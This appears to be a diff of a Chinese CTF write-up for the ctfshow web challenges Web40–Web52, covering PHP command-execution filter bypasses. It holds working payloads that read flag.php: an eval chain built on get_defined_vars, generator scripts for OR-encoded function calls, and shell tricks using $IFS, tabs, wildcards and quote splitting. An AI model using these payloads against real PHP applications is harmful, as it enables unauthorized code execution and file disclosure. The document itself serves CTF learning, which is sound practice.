@@ -12,7 +12,7 @@ Web40
   
 过滤了很多，只有字母，空格，分号，英文括号等能用（注意：正则中过滤的是正文括号）  
   
-   
+   
   
 get_defined_vars()：PHP 内置函数，返回当前所有已定义变量的数组（包含$_GET/$_POST/$_COOKIE等）；  
   
@@ -24,19 +24,19 @@ next()：将数组指针移动到下一个元素并返回其值（这里定位�
   
 array_pop()：弹出数组最后一个元素（这里提取$_POST里的代码内容）。  
   
-   
+   
   
 GET传参：  
-    
+    
 /?c=eval(array_pop(next(get_defined_vars())));  
   
 POST传参： 1=echo file_get_contents ('flag.php');  
   
-   
+   
   
 ![](https://mmbiz.qpic.cn/sz_mmbiz_png/DBT7MicbvsEzu6g5bg4gJhB1FLgfhhn8gJgDelh2yqMktyQa7VxOZSvkHXIA1Ea2rbc6oe7vl8ibn2tm74t4iaMaxP4V4TIJZgIM09vib4FMv6Q/640?wx_fmt=png "")  
   
-   
+   
   
 查看源码得到flag  
   
@@ -52,112 +52,112 @@ Web41
   
 ![](https://mmbiz.qpic.cn/sz_mmbiz_png/DBT7MicbvsEzecRB5NrNWiafNRHS4hgzvLYKeL8qyGrk2z2XgapU5AvRVVSave5EGPpy6nXCYRpjMMDWUP4ZcfVDBMbhImmavPB36YQG1ydIM/640?wx_fmt=png "")  
   
-   
+   
   
 这里字母也进行了过滤，异或过滤了但或运算没有过滤，所以可以使用或运算过滤  
   
-   
+   
   
 脚本：  
   
-$myfile = fopen("res_xor.txt", "w");            
+$myfile = fopen("res_xor.txt", "w");            
   
-$contents="";            
+$contents="";            
   
-for ($i=0; $i < 256; $i++) {            
+for ($i=0; $i < 256; $i++) {            
   
-      
-for ($j=0; $j <256 ; $j++) {            
-  
-  
-          
-if($i<16){            
-  
-              
-$hex_i='0'.dechex($i);            
-  
-          
-}            
-  
-          
-else{            
-  
-              
-$hex_i=dechex($i);            
-  
-          
-}            
-  
-          
-if($j<16){            
-  
-              
-$hex_j='0'.dechex($j);            
-  
-          
-}            
-  
-          
-else{            
-  
-              
-$hex_j=dechex($j);            
-  
-          
-}            
-  
-          
-$preg = '/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i';//根据题目给的正则表达式修改即可            
-  
-          
-if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){            
-  
-              
-echo "";            
-  
-          
-}            
+      
+for ($j=0; $j <256 ; $j++) {            
   
   
-          
-else{            
+          
+if($i<16){            
   
-              
-$a='%'.$hex_i;            
+              
+$hex_i='0'.dechex($i);            
   
-              
-$b='%'.$hex_j;            
+          
+}            
   
-              
-$c=(urldecode($a)|urldecode($b));            
+          
+else{            
   
-              
-if (ord($c)>=32&ord($c)<=126) {            
+              
+$hex_i=dechex($i);            
   
-                  
-$contents=$contents.$c." ".$a." ".$b."\n";            
+          
+}            
   
-              
-}            
+          
+if($j<16){            
   
-          
-}            
+              
+$hex_j='0'.dechex($j);            
+  
+          
+}            
+  
+          
+else{            
+  
+              
+$hex_j=dechex($j);            
+  
+          
+}            
+  
+          
+$preg = '/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i';//根据题目给的正则表达式修改即可            
+  
+          
+if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){            
+  
+              
+echo "";            
+  
+          
+}            
   
   
-      
-}            
+          
+else{            
   
-}            
+              
+$a='%'.$hex_i;            
   
-fwrite($myfile,$contents);            
+              
+$b='%'.$hex_j;            
+  
+              
+$c=(urldecode($a)|urldecode($b));            
+  
+              
+if (ord($c)>=32&ord($c)<=126) {            
+  
+                  
+$contents=$contents.$c." ".$a." ".$b."\n";            
+  
+              
+}            
+  
+          
+}            
+  
+  
+      
+}            
+  
+}            
+  
+fwrite($myfile,$contents);            
   
 fclose($myfile);  
   
-   
+   
   
-   
+   
   
-   
+   
   
 import requests  
   
@@ -167,75 +167,75 @@ from sys import *
   
 import os  
   
-   
+   
   
 def action(arg):  
   
-    s1 = ""  
+    s1 = ""  
   
-    s2 = ""  
+    s2 = ""  
   
-    for i in arg:  
+    for i in arg:  
   
-        f = open("res_xor.txt", "r")  
+        f = open("res_xor.txt", "r")  
   
-        while True:  
+        while True:  
   
-            t = f.readline()  
+            t = f.readline()  
   
-            if t == "":  
+            if t == "":  
   
-                break  
+                break  
   
-            if t[0] == i:  
+            if t[0] == i:  
   
-                # print(i)  
+                # print(i)  
   
-                s1 += t[2:5]  
+                s1 += t[2:5]  
   
-                s2 += t[6:9]  
+                s2 += t[6:9]  
   
-                break  
+                break  
   
-        f.close()  
+        f.close()  
   
-    output = "(\"" + s1 + "\"|\"" + s2 + "\")"  
+    output = "(\"" + s1 + "\"|\"" + s2 + "\")"  
   
-    return (output)  
+    return (output)  
   
-   
+   
   
 while True:  
   
-    param = action(input("\n[+] your function：")) + action(input("[+] your command：")) + ";"  
+    param = action(input("\n[+] your function：")) + action(input("[+] your command：")) + ";"  
   
 print(param)  
   
-   
+   
   
-   
+   
   
-   
+   
   
 POST传参  
   
-   
+   
   
 [+] your function：file_get_contents  
   
 [+] your command：flag.php  
   
-   
+   
   
 C= ("%06%09%0c%05%00%07%05%14%00%03%0f%0e%14%05%0e%14%13"|"%60%60%60%60%5f%60%60%60%5f%60%60%60%60%60%60%60%60")("%06%0c%01%07%00%10%08%10"|"%60%60%60%60%2e%60%60%60")  
   
-   
+   
   
 [+] your function：readfile  
   
 [+] your command：flag.php  
   
-   
+   
   
 C= ("%12%05%01%04%06%09%0c%05"|"%60%60%60%60%60%60%60%60")("%06%0c%01%07%00%10%08%10"|"%60%60%60%60%2e%60%60%60")  
   
@@ -251,7 +251,7 @@ Web42
   
 >/dev/null 2>&1：  
   
-   
+   
 >/dev/null表示将命令的标准输出重定向到/dev/null，也就是不输出任何信息到终端，也就是不显示任何信息；  
   
 2>&1表示2的输出重定向等同于1。  
@@ -260,7 +260,7 @@ Web42
   
 那么想要命令回显，我们可以输入两个命令，并进行命令分隔。  
   
-   
+   
   
 /?c=ls ||  
   
@@ -274,7 +274,7 @@ Web43
   
 /?c=tac flag.php ||  
   
-   
+   
   
 Web44  
   
@@ -294,19 +294,19 @@ Web46
   
 ?c=tac%09fla?.php||  
   
-   
+   
   
 Web47  
-    
+    
 web48  
-    
+    
 web49(  
 注意：  
- %09  
+ %09  
 是URL编码，PHP接收到时已经解码了！  
 )  
   
-   
+   
   
 多过滤了一些但无影响  
   
@@ -314,7 +314,7 @@ web49(
   
 ?c=tac%09fla?.php||  
   
-   
+   
   
 Web50  
   
@@ -323,7 +323,7 @@ Web50
 /?c=tac <fla’’g.php||  
   
 （不知道为啥  
-/?c=tac<fla?.php||   
+/?c=tac<fla?.php||   
 不行）  
   
 Web51  
@@ -332,23 +332,23 @@ Web51
   
 /?c=nl<fla%27%27g.php||  
   
-   
+   
   
 Web52  
   
-   
+   
   
-多过滤了<和>，但是没过滤$。   
+多过滤了<和>，但是没过滤$。   
   
-?c=ta''c$IFS/fla’’g||   
+?c=ta''c$IFS/fla’’g||   
   
-?c=tac       
+?c=tac       
   
 ?c=nl${IFS}/fl''ag||  
   
-   
+   
   
-   
+   
   
 
 
